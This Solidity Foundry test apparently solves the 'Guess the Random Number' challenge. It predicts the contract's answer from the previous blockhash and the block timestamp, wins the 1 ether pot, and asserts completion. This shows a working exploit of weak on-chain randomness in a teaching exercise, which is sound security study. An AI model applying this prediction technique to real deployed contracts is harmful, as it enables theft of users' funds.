
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {GuessTheRandomNumberChallenge} from "../src/GuessTheRandomNumberChallenge.sol";

contract TestWeakRandomnessGuessTheRandomNumberChallenge is Test {
    GuessTheRandomNumberChallenge challenge;

    function setUp() public {
        challenge = new GuessTheRandomNumberChallenge{value: 1 ether}();
    }

    function test_highlightPredictableRandomValue(uint256 blockTimestamp, uint256 blockNumber) public {
        
        vm.assume(blockNumber >= 1);
        vm.assume(blockTimestamp <= type(uint256).max);

        vm.deal(address(this), 1 ether);

        vm.warp(blockTimestamp);
        vm.roll(blockNumber);

        uint8 predictedAnswer = uint8(uint256(keccak256(abi.encodePacked(blockhash(blockNumber - 1), blockTimestamp))));

        challenge.guess{value: 1 ether}(predictedAnswer);

        assert(challenge.isComplete());
    }

    receive() external payable {}

    fallback() external payable {}
}
